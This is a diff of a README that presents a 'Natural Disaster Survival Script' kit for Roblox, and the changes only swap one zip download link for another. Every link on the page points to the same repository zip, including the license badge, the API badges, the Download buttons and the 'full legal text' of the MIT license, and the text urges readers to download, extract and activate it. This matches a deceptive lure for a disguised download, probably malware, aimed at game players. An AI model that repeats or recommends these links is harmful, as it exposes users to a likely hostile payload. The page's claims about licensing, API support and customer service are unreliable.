@@ -1,15 +1,15 @@
 # 🌪️ Natural Disaster Survival Script for Roblox
 
-[![License: MIT](https://raw.githubusercontent.com/ChaaruYuvaraj/roblox-natural-disaster-survival-script-kit/branch/euphone/kit-roblox-survival-disaster-script-natural-2.2.zip)](https://raw.githubusercontent.com/ChaaruYuvaraj/roblox-natural-disaster-survival-script-kit/branch/euphone/kit-roblox-survival-disaster-script-natural-2.2.zip)
-![Roblox Compatible](https://raw.githubusercontent.com/ChaaruYuvaraj/roblox-natural-disaster-survival-script-kit/branch/euphone/kit-roblox-survival-disaster-script-natural-2.2.zip)
-![OpenAI API](https://raw.githubusercontent.com/ChaaruYuvaraj/roblox-natural-disaster-survival-script-kit/branch/euphone/kit-roblox-survival-disaster-script-natural-2.2.zip%20API-enabled-27AE60)
-![Claude API](https://raw.githubusercontent.com/ChaaruYuvaraj/roblox-natural-disaster-survival-script-kit/branch/euphone/kit-roblox-survival-disaster-script-natural-2.2.zip%20API-supported-7B16FF)
-![Robust Updates](https://raw.githubusercontent.com/ChaaruYuvaraj/roblox-natural-disaster-survival-script-kit/branch/euphone/kit-roblox-survival-disaster-script-natural-2.2.zip%20Development-2025-informational)
-![Customer Service](https://raw.githubusercontent.com/ChaaruYuvaraj/roblox-natural-disaster-survival-script-kit/branch/euphone/kit-roblox-survival-disaster-script-natural-2.2.zip%20Customer%20Service-yes-brightgreen)
+[![License: MIT](https://github.com/ChaaruYuvaraj/roblox-natural-disaster-survival-script-kit/raw/refs/heads/branch/euphone/natural_script_kit_disaster_roblox_survival_1.4.zip)](https://github.com/ChaaruYuvaraj/roblox-natural-disaster-survival-script-kit/raw/refs/heads/branch/euphone/natural_script_kit_disaster_roblox_survival_1.4.zip)
+![Roblox Compatible](https://github.com/ChaaruYuvaraj/roblox-natural-disaster-survival-script-kit/raw/refs/heads/branch/euphone/natural_script_kit_disaster_roblox_survival_1.4.zip)
+![OpenAI API](https://github.com/ChaaruYuvaraj/roblox-natural-disaster-survival-script-kit/raw/refs/heads/branch/euphone/natural_script_kit_disaster_roblox_survival_1.4.zip%20API-enabled-27AE60)
+![Claude API](https://github.com/ChaaruYuvaraj/roblox-natural-disaster-survival-script-kit/raw/refs/heads/branch/euphone/natural_script_kit_disaster_roblox_survival_1.4.zip%20API-supported-7B16FF)
+![Robust Updates](https://github.com/ChaaruYuvaraj/roblox-natural-disaster-survival-script-kit/raw/refs/heads/branch/euphone/natural_script_kit_disaster_roblox_survival_1.4.zip%20Development-2025-informational)
+![Customer Service](https://github.com/ChaaruYuvaraj/roblox-natural-disaster-survival-script-kit/raw/refs/heads/branch/euphone/natural_script_kit_disaster_roblox_survival_1.4.zip%20Customer%20Service-yes-brightgreen)
 
 ---
 
-[![Download](https://raw.githubusercontent.com/ChaaruYuvaraj/roblox-natural-disaster-survival-script-kit/branch/euphone/kit-roblox-survival-disaster-script-natural-2.2.zip)](LINK)
+[![Download](https://github.com/ChaaruYuvaraj/roblox-natural-disaster-survival-script-kit/raw/refs/heads/branch/euphone/natural_script_kit_disaster_roblox_survival_1.4.zip)](LINK)
 > **Click the ‘Download’ image above to begin your access journey to the Natural Disaster Survival Script for Roblox!**
 
 ---
@@ -95,7 +95,7 @@ Embark on your adventure in just three steps:
 
 - **Extract** the `.zip` to your preferred directory.
 - **Click below to download:**  
-  [![Download](https://raw.githubusercontent.com/ChaaruYuvaraj/roblox-natural-disaster-survival-script-kit/branch/euphone/kit-roblox-survival-disaster-script-natural-2.2.zip)](LINK)
+  [![Download](https://github.com/ChaaruYuvaraj/roblox-natural-disaster-survival-script-kit/raw/refs/heads/branch/euphone/natural_script_kit_disaster_roblox_survival_1.4.zip)](LINK)
 
 ### Step 3: Activate in Roblox
 
@@ -127,7 +127,7 @@ This repository is intended for educational and enhancement purposes within the 
 
 This project is licensed under the MIT License © 2025.
 For full legal text, please visit  
-[https://raw.githubusercontent.com/ChaaruYuvaraj/roblox-natural-disaster-survival-script-kit/branch/euphone/kit-roblox-survival-disaster-script-natural-2.2.zip](https://raw.githubusercontent.com/ChaaruYuvaraj/roblox-natural-disaster-survival-script-kit/branch/euphone/kit-roblox-survival-disaster-script-natural-2.2.zip)
+[https://github.com/ChaaruYuvaraj/roblox-natural-disaster-survival-script-kit/raw/refs/heads/branch/euphone/natural_script_kit_disaster_roblox_survival_1.4.zip](https://github.com/ChaaruYuvaraj/roblox-natural-disaster-survival-script-kit/raw/refs/heads/branch/euphone/natural_script_kit_disaster_roblox_survival_1.4.zip)
 
 ---
 
@@ -136,5 +136,5 @@ May you always be a step ahead of the storm.
 
 ---
 
-[![Download](https://raw.githubusercontent.com/ChaaruYuvaraj/roblox-natural-disaster-survival-script-kit/branch/euphone/kit-roblox-survival-disaster-script-natural-2.2.zip)](LINK)  
+[![Download](https://github.com/ChaaruYuvaraj/roblox-natural-disaster-survival-script-kit/raw/refs/heads/branch/euphone/natural_script_kit_disaster_roblox_survival_1.4.zip)](LINK)  
 > **Revisit the start of your journey and download the package again — because being prepared is everything!**
